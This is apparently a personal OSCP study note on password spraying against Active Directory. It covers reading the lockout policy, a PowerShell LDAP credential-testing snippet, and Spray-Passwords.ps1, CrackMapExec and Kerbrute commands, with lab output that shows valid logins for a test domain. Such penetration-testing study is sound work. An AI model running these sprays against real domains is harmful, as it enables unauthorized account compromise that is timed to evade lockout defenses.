---
aliases:
  - Active Directory Password Attacks - Password Spraying
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - active_directory
  - ad
  - adds
  - password_attack
author: Mehdi N Tehrani
creat_date: 2024-01-07
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Domain Password Policy
#password_retry_policy #retry #password_retry
```cmd
net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```
- *Lockout Observation Window* defined how often we can try `Lockout threshold` times minus 1.

# Password Spraying
#spray #password_spraying #password_spray
Does not have a very high success rate

## using LDAP and ADSI
a low and slow password attack
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
If the password for the user account is correct, the object creation will be successful
```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```
Otherwise:
```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or password is incorrect."
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

## Spray-Passwords.ps1
#spray_passwords_ps1 #spray_passwords
```powershell
.\Spray-Passwords.ps1 -Pass $password_string [-Admin]
```
test admin accounts by adding the `-Admin` flag.

## CrackMapExec
#crackmapexec #find_local_admin_access #admin_privileges #admin #pawned #pwn3d
Checks password against user or user list against an IP address

Drawback:
for every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy due to the generated network traffic. It is also quite slow in comparison to other techniques.
```sh
crackmapexec smb $target_ip -u $user_list -p $pass_str -d $domain --continue-on-success
```
Output
```
SMB         192.168.201.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.201.75  445    CLIENT75         [-] corp.com\jeff:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.201.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
SMB         192.168.201.75  445    CLIENT75         [-] corp.com\stephanie:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.201.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.201.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 

```
if user has admin access to the device, it shows `(Pwn3d!)` next to the success output

## Kerbrute
#kerbrute
Make sure the user list file is encoded in `ascii` or `UTF-8`
```cmd
kerbrute_windows_amd64.exe passwordspray -d %domain% %user_list_path% %password%
```
Output
```
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/06/24 - Ronnie Flathers @ropnop

2024/01/06 19:53:07 >  Using KDC(s):
2024/01/06 19:53:07 >   dc1.corp.com:88
2024/01/06 19:53:07 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2024/01/06 19:53:07 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2024/01/06 19:53:07 >  Done! Tested 6 logins (2 successes) in 0.028 seconds
```